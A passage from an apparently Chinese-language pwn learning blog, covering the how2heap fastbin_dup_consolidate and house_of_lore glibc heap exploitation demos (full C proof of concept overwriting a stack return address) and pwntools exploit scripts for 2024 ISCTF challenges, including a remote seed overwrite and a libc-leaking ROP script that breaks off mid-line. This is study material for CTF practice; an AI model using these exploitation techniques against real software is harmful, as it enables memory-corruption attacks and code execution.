request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a tcache-sized chunk with chunk size 0x410. p3=%p\n&quot;</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nmalloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So p1 is double freed, and p3 hasn&#x27;t been freed although it now points to a free chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We have thus achieved UAF on tcache!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will request a chunk of size 0x400, this will give us the 0x410 chunk thats currently in\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the tcache bin. p3 and p1 will still be pointing to it.\n&quot;</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We now have two pointers (p3 and p4) that haven&#x27;t been directly freed\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;and both point to the same tcache sized chunk. p3=%p p4=%p\n&quot;</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We have achieved duplication!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Note: This duplication would have also worked with a larger chunk size, the chunks would\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;have behaved the same, just being taken from the top instead of from the tcache bin.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里借用一下how2heap 2.35的fastbin dup consolidate实验</p><p>我们主要关注malloc_consolidate这个过程</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>在函数19行那里</p><p>我们申请了一个堆快，地址为0x4048d0</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411252039374.png" alt="image-20241125203943273"></p><p>接着，我们释放这个堆快，可以看到被放到了fastbins里面</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411252043238.png" alt="image-20241125204334206"></p><p>我们再次申请0x400地址时，这个堆的地址出现在了原来申请的p1处</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411252044537.png" alt="image-20241125204455491"></p><p>不可能是直接从fastbin中拿地址出来的，这里出现了malloc_consolidate机制</p><blockquote><p>简单来说就是先把fastbins中的值放进了top_chunk中，然后再从top_chunk获得地址的</p></blockquote><p>那么什么情况下会有这样的机制呢，引用一下下面参考博客大佬的结论（具体源码看末尾的文章）</p><blockquote><p>1._int_malloc<code>中，当不能从</code>fastbin<code>中申请，且申请大小不属于</code>small size<code>时，如果当前</code>arena<code>有</code>fastbin chunk</p><p>2._int_malloc中，当无法通过top chunk分配，且arena中有fastbin chunk时</p><p>3._int_free<code>中，释放到</code>unsortedbin<code>进行</code>consolidation<code>的过程中，在向前向后合并完成了以后，如果合并的大小超过</code>0x10000</p></blockquote><p>检查</p><blockquote><ol><li>在遍历的时候，会检查chunk的内存对齐</li><li>在遍历的时候，会检查chunk的大小和fastbin的大小是否匹配</li><li>在向前合并的时候，会检查prev_size和前一个chunk的size是否相同</li></ol></blockquote><p>在次过程后，结合上面实验的double free就可以伪造chunk了</p><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>这个洞的版本抗性很高，2.35居然还能用</p><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><p><a href="https://www.52pojie.cn/thread-1881991-1-1.html#49248926_%E5%AE%9E%E9%AA%8C%EF%BC%9Ahitbctf2018---netupig">堆利用详解：the house of rabbit（超详细） - 吾爱破解 - 52pojie.cn</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> how2heap(2.23) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house_of_lore</title>
      <link href="/posts/28762.html"/>
      <url>/posts/28762.html</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>先附上how2heap的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>函数开始，先把两个申请了栈上的地址初始化了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241513663.png" alt="image-20241124151323581"></p><p>接着，申请了一个堆快，并且把返回地址放到了victim</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241516268.png" alt="image-20241124151623226"></p><p>把申请的堆的地址放到vic_chunk里</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241525027.png" alt="image-20241124152533990"></p><p>现在把stack_buffer_1的地址的值进行修改</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241528569.png" alt="image-20241124152819523"></p><p>现在的两个栈上的值如下了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241530669.png" alt="image-20241124153015650"></p><p>接着又申请了一个堆快p5</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241531558.png" alt="image-20241124153156514"></p><p>我们释放了victim(前后对比)</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241533080.png" alt="image-20241124153301044"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241533110.png" alt="image-20241124153324069"></p><p>因为又申请了一个堆快，因为我们的bin从unsoredbin 到了smallbin,故fd和bk指针发生了变化</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241536282.png" alt="image-20241124153639249"></p><p>接着我们改写了原来的victim那个堆快的bk指针为stack_buffer_1的地址</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241548281.png" alt="image-20241124154857249"></p><p>可以看到现在的bins中</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241551723.png" alt="image-20241124155129681"></p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>先malloc一个与我们释放的bins相同大小的chunk</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241602023.png" alt="image-20241124160224969"></p><p>再来一次</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241605269.png" alt="image-20241124160516195"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411241618827.png" alt="image-20241124161844791"></p><blockquote><p>好了，我们来分析着重分析一下这两个步骤，因为我们申请的堆快是从已释放的bins中拿，所以bk，和上一个堆快的fd指针会有个变化，所以我们stack_buffer_1 stack_buffer_2的fd指针都在重新申请堆快的过程中变成了最开始函数的bk指针</p></blockquote><p>后面就是通过溢出，改变ret后面的值从而执行我们自定义的hanshu</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>就是通过改写smallbins的bk指针实现任意的地址写</p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> how2heap(2.23) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 ISCFT-PWN复现</title>
      <link href="/posts/15792.html"/>
      <url>/posts/15792.html</url>
      
        <content type="html"><![CDATA[<h1 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h1><p>第六个数组输入的时候，输入的值将决定循环的顺序，再填入后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;27.25.151.12&#x27;</span>,<span class="number">25622</span>)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">gift=<span class="number">0x401216</span></span><br><span class="line">payload=p64(gift)*<span class="number">5</span>+<span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;300&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your 7 girlfriend birthday&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your 8 girlfriend birthday&#x27;</span>,<span class="string">b&#x27;4198942&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h1><p>伪随机数通过溢出覆盖seed,再按照题目给的进行输入就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;27.25.151.12&#x27;</span>,<span class="number">39274</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x190</span>+p64(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">elf = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Round&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20001</span>):</span><br><span class="line">    a=elf.rand() % <span class="number">7</span> + <span class="number">1</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h1><p>题目开了沙箱，只能orw</p><p>这题本来想在本地写shellcode，在栈迁移到bss段执行，理论上应该可以，但是一直没有写出来</p><p>看了网上的wp，发现可以直接找open函数read函数和puts完成orw，下面的脚本是网上找到，自己加了点注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;]</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4012ce</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">main = <span class="number">0x4012a1</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line">flag = bss + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_libc = <span class="string">b&quot;a&quot;</span>*<span class="number">32</span> + <span class="string">b&quot;b&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got)  + p64(puts_plt) + p64(main)</span><br><span class="line">io.sendafter(<span class="string">b&quot;oh,what&#x27;s this?\n&quot;</span>, get_libc)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span 